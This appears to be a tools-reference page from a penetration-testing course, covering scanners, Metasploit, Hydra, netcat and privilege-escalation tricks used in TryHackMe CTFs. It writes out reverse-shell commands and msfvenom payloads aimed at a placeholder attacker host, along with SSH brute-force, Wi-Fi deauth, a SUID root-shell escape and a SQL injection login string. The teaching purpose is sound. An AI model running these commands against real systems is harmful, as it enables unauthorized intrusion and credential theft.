# Tools Reference

Every tool exercised in the course, with canonical invocations and the lab context in which it was used.

## Tool Selection Decision Tree

```mermaid
flowchart TD
    START["🎯 What phase are you in?"]

    START --> RECON["1️⃣ Reconnaissance"]
    START --> ENUM["2️⃣ Enumeration"]
    START --> EXPLOIT["3️⃣ Exploitation"]
    START --> POST["4️⃣ Post-Exploitation"]

    RECON --> NMAP_INIT["Nmap -sn\nHost discovery"]
    RECON --> OSINT["WHOIS / dig / Shodan\nPassive recon"]

    ENUM --> WEB{"Web app?"}
    ENUM --> NET{"Network\nservices?"}

    WEB -->|Yes| CMS{"CMS detected?"}
    WEB -->|No| NMAP_SV["Nmap -sC -sV -p-\nFull service scan"]

    CMS -->|WordPress| WPSCAN["WPScan\n--enumerate u,p,t"]
    CMS -->|Joomla| JOOMSCAN["JoomScan\n--url target"]
    CMS -->|Unknown| GOBUSTER["Gobuster dir\n+ Nikto"]

    NET -->|FTP| FTP_ANON["ftp anonymous\nBanner grab + ls"]
    NET -->|SSH| HYDRA["Hydra\nSSH brute-force"]
    NET -->|HTTP| GOBUSTER

    EXPLOIT --> INJECTION{"Injection\npoint found?"}
    EXPLOIT --> CREDS{"Credentials\navailable?"}

    INJECTION -->|Web param| CURL_RCE["curl / browser\nCommand injection"]
    INJECTION -->|SQL| SQLMAP["SQLMap\n--batch --dbs"]
    CREDS -->|WP admin| THEME_EDIT["Theme Editor\nPHP reverse shell"]
    CREDS -->|SSH| SSH_LOGIN["ssh user@target"]

    POST --> SUID["find / -perm -4000\nSUID enumeration"]
    POST --> SUDO["sudo -l\nPermitted commands"]
    POST --> LINPEAS["LinPEAS\nAutomated enumeration"]
    SUID --> GTFO["GTFOBins\nLookup + exploit"]

    style START fill:#1a1a2e,stroke:#e94560,color:#fff
    style RECON fill:#16213e,stroke:#e94560,color:#fff
    style ENUM fill:#0f3460,stroke:#e94560,color:#fff
    style EXPLOIT fill:#533483,stroke:#e94560,color:#fff
    style POST fill:#4a0072,stroke:#e94560,color:#fff
```

---

## Platform

### Kali Linux

Debian-based penetration testing distribution maintained by Offensive Security. Used as the attacker VM throughout the course. Pre-built images distributed via Kali's official download page and via TryHackMe.

- **Official downloads:** <https://www.kali.org/get-kali/>
- **TryHackMe Kali image:** pre-configured with the course's standard wordlists and tools
- **Update cadence:** `sudo apt update && sudo apt full-upgrade -y`

### VirtualBox

Free hypervisor used for host-level virtualization. Alternative supported: VMware ESXi.

### TryHackMe

Lab platform hosting the course CTFs. Free tier was sufficient; the paid "Attack Box" (in-browser Kali) was optional.

- **Connection:** OpenVPN profile downloaded from room pages → `sudo openvpn username.ovpn`
- **Rooms used this course:** Pickle Rick, Mr. Robot CTF, Boiler CTF, and ~8 supporting walkthrough rooms

---

## Reconnaissance & Enumeration

### Nmap

The indispensable port scanner. Used in every lab and both CTFs.

**Canonical invocations:**

```bash
# Full-port service/version scan with default scripts (CTF standard)
sudo nmap -sC -sV -p- -oN nmap_full.txt <target>

# Aggressive scan with OS detection
sudo nmap -A -T4 -p- <target>

# Fast-timed scan with output to file
nmap -A -T4 -p- <target> -v -oN results

# UDP scan (slow!)
sudo nmap -sU --top-ports 100 <target>

# Live-host discovery on a subnet
sudo nmap -sn 10.10.0.0/24
```

**Flags explained:**

- `-sS` — SYN stealth scan (default when root)
- `-sV` — service/version detection
- `-sC` — run default NSE scripts
- `-A` — aggressive: `-sV -sC -O --traceroute`
- `-T4` — timing template (aggressive timing; `-T5` = insane)
- `-p-` — scan all 65,535 ports
- `-oN/-oA/-oX` — output to normal/all-formats/XML

### Gobuster

Directory and virtual-host brute-forcer. Fast and noisy; good first-pass web enumeration.

**Canonical invocations:**

```bash
# Directory enumeration with common wordlist
gobuster dir -u http://<target> -w /usr/share/dirb/wordlists/common.txt

# Multi-extension scan
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# Virtual host brute-force
gobuster vhost -u http://<target> -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
```

**Course usage:**

- Pickle Rick: `gobuster dir -u http://10.10.13.213 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt` → `/portal.php` discovered
- Boiler CTF: `gobuster dir -u http://<target>/joomla/ -w /usr/share/dirb/wordlists/common.txt` → `/joomla/_test` discovered

### Nikto

Web server vulnerability scanner. Detects outdated software, default files, insecure configurations.

```bash
nikto -host http://<target>
nikto -host http://<target> -port 8080 -Tuning 9
```

### curl

HTTP Swiss Army knife. Used for manual inspection, `robots.txt`, headers, and raw response bodies.

```bash
# Fetch robots.txt
curl http://<target>/robots.txt

# Show response headers only
curl -I http://<target>

# Send custom User-Agent
curl -A "Mozilla/5.0" http://<target>

# POST form data
curl -X POST -d "user=admin&pass=admin" http://<target>/login
```

### FTP client

Anonymous FTP login was a repeated theme; on Boiler CTF an anonymous login surfaced a ROT13-encoded `.info.txt`.

```bash
ftp <target>
# Name: anonymous
# Password: (blank)
ls -la
get .info.txt
```

---

## Vulnerability Assessment

### OpenVAS / Greenbone

Open-source vulnerability scanner. Week 5 lab focus.

- **Installation:** `sudo apt install openvas` (substantial setup time; ~20GB feed sync)
- **Web UI:** `https://localhost:9392/`
- **Default workflow:** Configure → Targets → Tasks → Run → Review Reports

### JoomScan

OWASP's Joomla vulnerability scanner. Used on Boiler CTF against Joomla 3.9.10.

```bash
# Install
sudo apt install joomscan

# Run
joomscan --url http://<target>/joomla/
```

**What it finds:**

- Joomla version detection
- Core vulnerability checks
- Admin / components / modules / templates paths
- Configuration / status file exposure

### WPScan

WordPress vulnerability scanner. Applicable to the Mr. Robot CTF WordPress target.

```bash
wpscan --url http://<target> --enumerate u,p,t
wpscan --url http://<target> -U users.txt -P rockyou.txt
```

### searchsploit / Exploit-DB

Offline mirror of Exploit-DB's published exploit archive.

```bash
searchsploit joomla 3.9
searchsploit sar2html
```

---

## Exploitation

> [!WARNING]
> Every tool in this section can cause real damage to real systems. Use them **only** against targets you have written authorization to test. See [Legal & Ethics](legal-and-ethics.md) for the full framework.

### Metasploit Framework

The industry-standard exploitation framework. Metasploit provides a modular architecture for exploit development, payload generation, post-exploitation, and reporting. Not the primary tool for the course CTFs (which emphasized manual methods), but essential knowledge for any penetration tester.

**Core workflow:**

```bash
# Launch the console
msfconsole

# Search for exploits
msf6 > search joomla type:exploit
msf6 > search sar2html

# Select and configure an exploit
msf6 > use exploit/unix/webapp/joomla_comfields_sqli_rce
msf6 exploit(joomla_comfields_sqli_rce) > show options
msf6 exploit(joomla_comfields_sqli_rce) > set RHOSTS <target>
msf6 exploit(joomla_comfields_sqli_rce) > set LHOST <attacker>

# Run the exploit
msf6 exploit(joomla_comfields_sqli_rce) > exploit

# Manage sessions (if exploit succeeds)
msf6 > sessions -l            # List active sessions
msf6 > sessions -i 1          # Interact with session 1
```

**Key modules used or referenced in this course:**

| Module | Purpose | Context |
|---|---|---|
| `exploit/windows/smb/ms17_010_eternalblue` | EternalBlue SMB RCE | Week 6 — Network Services |
| `exploit/unix/webapp/joomla_comfields_sqli_rce` | Joomla SQL injection → RCE | Week 13 — Boiler CTF (alternative path) |
| `auxiliary/scanner/smb/smb_enumshares` | SMB share enumeration | Week 6 — Network Services |
| `auxiliary/scanner/ssh/ssh_version` | SSH version fingerprinting | General reconnaissance |
| `post/multi/recon/local_exploit_suggester` | Suggest local privesc exploits | Post-exploitation |

**Payload generation with msfvenom:**

```bash
# PHP reverse shell (used in WordPress theme editor attacks like Mr. Robot)
msfvenom -p php/reverse_php LHOST=<attacker> LPORT=4444 -f raw > shell.php

# Linux reverse shell (ELF binary)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f elf > shell.elf

# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f exe > shell.exe
```

> [!TIP]
> In real engagements, prefer manual exploitation when possible — it demonstrates deeper understanding and avoids Metasploit's network signatures that modern EDR detects. Use Metasploit for efficiency when manual methods are impractical or when its post-exploitation modules (pivoting, session management) add genuine value.

### Hydra

Network login brute-forcer. Candidates: SSH, FTP, HTTP forms, RDP, MySQL, PostgreSQL, SMB.

```bash
# SSH brute-force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>

# HTTP POST form
hydra -l admin -P passwords.txt <target> http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

### John the Ripper

Password hash cracker.

```bash
# Auto-detect hash format and crack with default wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### netcat (nc)

TCP/UDP connection tool; reverse-shell listener; port scanner; banner grabber.

```bash
# Listen for reverse shell
nc -lvnp 4444

# Connect back from victim
nc <attacker> 4444 -e /bin/bash
```

---

## Post-Exploitation & Privilege Escalation

> [!NOTE]
> Post-exploitation is where discipline matters most. Document every command, every file accessed, and every credential discovered. In a real engagement, this is where the report is built — and where scope violations happen if you are not careful.

### GTFOBins

Curated list of Unix binaries that can be abused for privilege escalation or sandbox escape when installed with SUID or misconfigured sudo rules.

- **Site:** <https://gtfobins.github.io/>

**Example from Boiler CTF:**

```bash
# SUID find → root shell
/usr/bin/find . -exec /bin/sh -p \; -quit
```

### LinPEAS / WinPEAS

Automated enumeration scripts for Linux and Windows privilege escalation surface.

```bash
# Transfer and run LinPEAS
curl -Lo linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Standard Linux shell primitives (used in Pickle Rick + Boiler)

```bash
id                                    # Current user/UID context
sudo -l                               # Commands runnable as other users
find / -perm -4000 2>/dev/null        # SUID binaries
find / -writable -type d 2>/dev/null  # World-writable dirs
cat /etc/crontab                      # Scheduled jobs
ls -la /home                          # Other users
ls -la /var/log                       # Log file access
```

---

## Wireless & Physical

### Wi-Fi Pineapple

Hak5 hardware rogue-AP device. Demonstrated in-class as the canonical example of captive-portal and evil-twin attacks.

### Flipper Zero

Multi-tool embedded device handling sub-gigahertz radio, RFID/NFC cloning, infrared, 1-Wire, and GPIO. Used for in-class wireless/physical demonstrations.

### aircrack-ng suite (referenced in Week 11)

```bash
airmon-ng start wlan0           # Put interface into monitor mode
airodump-ng wlan0mon            # Capture wireless traffic
aireplay-ng -0 5 -a <BSSID> wlan0mon   # Deauth attack
aircrack-ng -w wordlist.txt capture.cap  # Offline WPA handshake crack
```

---

## Helpers & Quality of Life

| Tool | Purpose |
|---|---|
| `tmux` | Persistent terminal sessions survive VPN drops |
| `asciinema` | Record terminal sessions for reports |
| `keepnote` / `CherryTree` / `Obsidian` | Note-taking for engagements |
| `flameshot` / Windows Snipping Tool | Screenshot capture |
| `curl` + `jq` | Parse JSON APIs |
| `grep -r -n --include="*.conf"` | Config hunting in compromised boxes |

---

## Burp Suite

**Purpose:** Intercepting web proxy for manual and automated web application testing.

**Category:** Web application analysis

**How it works:**
1. Configure browser to proxy through `127.0.0.1:8080`
2. Intercept requests in the Proxy tab — modify parameters, headers, cookies in real time
3. Use Repeater for manual request tampering; Intruder for automated fuzzing
4. Scanner (Pro only) crawls and identifies common web vulnerabilities

**Key features used in this course:**

| Feature | Use case |
|---|---|
| Proxy → Intercept | Capture and modify HTTP requests to web applications |
| Repeater | Manually replay modified requests (e.g., testing injection payloads) |
| Intruder | Automated parameter fuzzing and brute-force attacks |
| Decoder | Encode/decode Base64, URL, HTML entities, hex |
| Comparer | Diff two responses to identify subtle differences |

> [!TIP]
> Burp Suite Community Edition is free and sufficient for most course exercises. The Pro version adds the automated scanner and advanced Intruder features.

**Example:** Intercepting a login request to test for SQL injection:
```text
POST /login HTTP/1.1
Host: target.thm
Content-Type: application/x-www-form-urlencoded

username=admin' OR 1=1--&password=test
```

---

## Wireshark & tcpdump

**Purpose:** Network protocol analysis and packet capture.

**Category:** Network analysis

### Wireshark (GUI)

**Key use cases:**
- Capture traffic on specific interfaces (eth0, tun0 for VPN)
- Filter with display filters: `http`, `tcp.port == 80`, `ip.addr == 10.10.x.x`
- Follow TCP streams to reconstruct full conversations
- Export objects (HTTP files, SMB transfers)

### tcpdump (CLI)

**Common commands:**
```bash
# Capture all traffic on tun0 (TryHackMe VPN interface)
sudo tcpdump -i tun0 -w capture.pcap

# Filter by host and port
sudo tcpdump -i eth0 host 10.10.10.10 and port 80

# Read a capture file with verbose output
tcpdump -r capture.pcap -vv

# Capture only SYN packets (connection initiation)
sudo tcpdump -i tun0 'tcp[tcpflags] & tcp-syn != 0'
```

> [!NOTE]
> tcpdump is invaluable when Wireshark is unavailable (e.g., SSH-only access to a compromised host). Learning both ensures coverage in any engagement scenario.

---

## Tools Awareness — Not Covered In-Depth

The following tools were discussed or demonstrated but not used hands-on in CTF rooms. Awareness of their purpose and positioning is relevant for interviews and team collaboration.

| Tool | Category | Purpose |
|---|---|---|
| **Maltego** | OSINT / Recon | Visual link analysis and relationship mapping for domains, emails, IPs |
| **Responder** | Credential Capture | LLMNR/NBT-NS/mDNS poisoner for capturing NTLMv2 hashes on Windows networks |
| **BloodHound** | Active Directory | Graph-based AD privilege escalation path finder |
| **Cobalt Strike** | C2 Framework | Commercial adversary simulation and red team operations platform |
| **Shodan** | OSINT / Recon | Internet-connected device search engine (IoT, servers, SCADA) |
| **CrackMapExec** | Post-Exploitation | Swiss army knife for Windows/AD network pentesting |
| **Impacket** | Network Protocols | Python collection for working with SMB, MSRPC, Kerberos, WMI |
| **Chisel** | Pivoting | Fast TCP/UDP tunnel over HTTP for pivoting through compromised hosts |

> [!TIP]
> When asked about unfamiliar tools in interviews, demonstrating awareness of *what category* a tool falls into (recon, exploitation, post-exploitation, C2) shows framework-level thinking even without hands-on experience.

---

## Third-Party Scripts & Attribution

The following third-party scripts were used during CTF engagements. They are **not included in this repository** (they are downloaded onto the target during engagements) but are documented here for reference.

| Script | Author / Project | Purpose | License |
|---|---|---|---|
| **linpeas.sh** | [PEASS-ng](https://github.com/peass-ng/PEASS-ng) | Linux privilege escalation enumeration | GNU GPL v3 |
| **pspy** | [DominicBreuker](https://github.com/DominicBreuker/pspy) | Unprivileged Linux process snooping | GNU GPL v3 |
| **php-reverse-shell.php** | [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell for web server exploitation | GNU GPL v2 |

> [!NOTE]
> These tools were used in TryHackMe lab environments only. In a real engagement, tool usage must be pre-approved in the Rules of Engagement and documented in the final report.

---

_Previous page:_ [Legal & Ethics](legal-and-ethics.md) · _Next page:_ [OWASP Top 10](owasp-top-10.md)

_Reference back-link:_ [Course README](../README.md) · [References](README.md)
